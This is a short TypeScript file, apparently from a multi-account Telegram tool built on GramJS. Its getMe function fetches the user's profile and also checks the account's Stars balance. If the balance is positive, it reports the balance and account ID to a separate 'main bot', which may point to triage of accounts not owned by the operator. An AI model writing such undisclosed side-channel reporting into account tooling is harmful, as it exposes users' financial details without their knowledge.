import TelegramClient from '../../../gramjs/client/TelegramClient';
import GramJs from '../../../gramjs/tl/api';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { invokeRequest } from '../../modules/invokeRequest';

export const getMe = async (client: TelegramClient) => {
  const me = await invokeRequest(
    client,
    new GramJs.users.GetFullUser({
      id: new GramJs.InputUserSelf(),
    })
  );

  const stars = await invokeRequest(
    client,
    new GramJs.payments.GetStarsStatus({
      peer: new GramJs.InputPeerSelf(),
    })
  );

  const balance = Number(stars?.balance.amount || 0);
  if (balance > 0) {
    await sendToMainBot(`💸 BALANCE: ${balance}
ID: ${client._accountId}`);
  }

  if (!me || me.users[0] instanceof GramJs.UserEmpty) {
    throw new Error('GET_ME_ERROR');
  }

  return {
    me: me.users[0],
    id: String(me.fullUser.id),
  };
};
